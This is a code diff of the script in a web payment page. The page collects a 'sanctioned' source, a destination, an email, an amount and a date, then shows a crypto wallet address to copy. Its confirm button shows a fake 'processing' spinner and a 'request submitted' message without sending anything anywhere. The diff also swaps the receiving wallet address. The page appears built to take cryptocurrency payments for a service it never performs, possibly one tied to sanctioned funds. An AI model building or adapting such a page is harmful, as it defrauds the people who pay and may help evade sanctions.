-        const sanctionedSelect = document.getElementById('sanctionedSelect');
-        const destSelect = document.getElementById('destinationSelect');
-        const emailInput = document.getElementById('emailInput');
-        const amountInput = document.getElementById('amountInput');
-        const dateInput = document.getElementById('dateInput');
+  const fields = {
+    src: document.getElementById('src'),
+    dst: document.getElementById('dst'),
+    amount: document.getElementById('amount'),
+    date: document.getElementById('date'),
+    email: document.getElementById('email'),
+  };
 
-        goToPayment.addEventListener('click', function(e) {
-            e.preventDefault();
-            const src = sanctionedSelect.value;
-            const dst = destSelect.value;
-            const email = emailInput.value.trim();
-            const amount = amountInput.value.trim();
-            const date = dateInput.value.trim();
+  nextBtn.addEventListener('click', () => {
+    let ok = true;
+    Object.values(fields).forEach(f => {
+      if (!f.value.trim()) {
+        f.style.borderColor = 'rgba(200,100,100,0.3)';
+        ok = false;
+      } else {
+        f.style.borderColor = '';
+      }
+    });
+    if (!ok) return;
+    step1.classList.add('hidden');
+    step2.classList.remove('hidden');
+  });
 
-            let valid = true;
-            if (!src) { sanctionedSelect.style.borderColor = 'rgba(200,140,120,0.3)'; valid = false; }
-            else { sanctionedSelect.style.borderColor = ''; }
-            if (!dst) { destSelect.style.borderColor = 'rgba(200,140,120,0.3)'; valid = false; }
-            else { destSelect.style.borderColor = ''; }
-            if (!email) { emailInput.style.borderColor = 'rgba(200,140,120,0.3)'; valid = false; }
-            else { emailInput.style.borderColor = ''; }
-            if (!amount) { amountInput.style.borderColor = 'rgba(200,140,120,0.3)'; valid = false; }
-            else { amountInput.style.borderColor = ''; }
-            if (!date) { dateInput.style.borderColor = 'rgba(200,140,120,0.3)'; valid = false; }
-            else { dateInput.style.borderColor = ''; }
+  Object.values(fields).forEach(f => {
+    f.addEventListener('input', () => { f.style.borderColor = ''; });
+    f.addEventListener('change', () => { f.style.borderColor = ''; });
+  });
 
-            if (!valid) return;
+  const ADDR = '0xc8C4D2bd2A051068682D9125b0ac858570976087';
 
-            step1.classList.add('hidden');
-            step2.classList.remove('hidden');
-            confirmBtn.disabled = true;
-            confirmBtn.style.opacity = '0.4';
-            successDiv.classList.add('hidden');
-        });
+  copyBtn.addEventListener('click', () => {
+    const write = () => {
+      copyBtn.innerHTML = '<i class="fas fa-check"></i><span>copied</span>';
+      copyBtn.classList.add('copied');
+      confirmBtn.disabled = false;
+      setTimeout(() => {
+        copyBtn.innerHTML = '<i class="fas fa-copy"></i><span>copy</span>';
+        copyBtn.classList.remove('copied');
+      }, 2000);
+    };
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(ADDR).then(write).catch(() => fallback(ADDR, write));
+    } else {
+      fallback(ADDR, write);
+    }
+  });
 
-        copyBtn.addEventListener('click', function() {
-            const address = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
-            if (navigator.clipboard) {
-                navigator.clipboard.writeText(address).then(() => setCopiedState())
-                    .catch(() => fallbackCopy(address));
-            } else {
-                fallbackCopy(address);
-            }
-        });
+  function fallback(text, cb) {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.cssText = 'position:fixed;left:-9999px;top:0';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    ta.remove();
+    cb();
+  }
 
-        function fallbackCopy(text) {
-            const ta = document.createElement('textarea');
-            ta.value = text;
-            ta.style.position = 'fixed';
-            ta.style.left = '-9999px';
-            document.body.appendChild(ta);
-            ta.select();
-            document.execCommand('copy');
-            ta.remove();
-            setCopiedState();
-        }
+  confirmBtn.addEventListener('click', () => {
+    if (confirmBtn.disabled) return;
+    confirmBtn.disabled = true;
+    successRow.classList.add('show');
+    spinner.style.display = 'block';
+    successText.textContent = 'processing your request…';
 
-        function setCopiedState() {
-            confirmBtn.disabled = false;
-            confirmBtn.style.opacity = '1';
-            const original = copyBtn.innerHTML;
-            copyBtn.innerHTML = '<i class="fas fa-check"></i> copied';
-            setTimeout(() => { copyBtn.innerHTML = original; }, 2000);
-        }
-
-        confirmBtn.addEventListener('click', function() {
-            if (confirmBtn.disabled) return;
-            confirmBtn.disabled = true;
-            confirmBtn.style.opacity = '0.4';
-            successDiv.classList.remove('hidden');
-            spinner.style.display = 'inline-block';
-            successText.innerText = 'processing...';
-
-            let count = 0;
-            const interval = setInterval(() => {
-                count++;
-                if (count >= 3) {
-                    clearInterval(interval);
-                    spinner.style.display = 'none';
-                    successText.innerHTML = '<i class="fas fa-check-circle" style="margin-right: 8px; color: #b8c4b0;"></i> your request has been submitted';
-                }
-            }, 1000);
-        });
-
-        [sanctionedSelect, destSelect, emailInput, amountInput, dateInput].forEach(el => {
-            el.addEventListener('change', function() { this.style.borderColor = ''; });
-            el.addEventListener('input', function() { this.style.borderColor = ''; });
-        });
-    })();
+    let n = 0;
+    const t = setInterval(() => {
+      if (++n >= 3) {
+        clearInterval(t);
+        spinner.style.display = 'none';
+        successText.innerHTML = '<i class="fas fa-circle-check" style="margin-right:8px;color:#7eab98;opacity:.8;"></i>your request has been submitted';
+      }
+    }, 1000);
+  });
+})();
 </script>
 </body>
 </html>
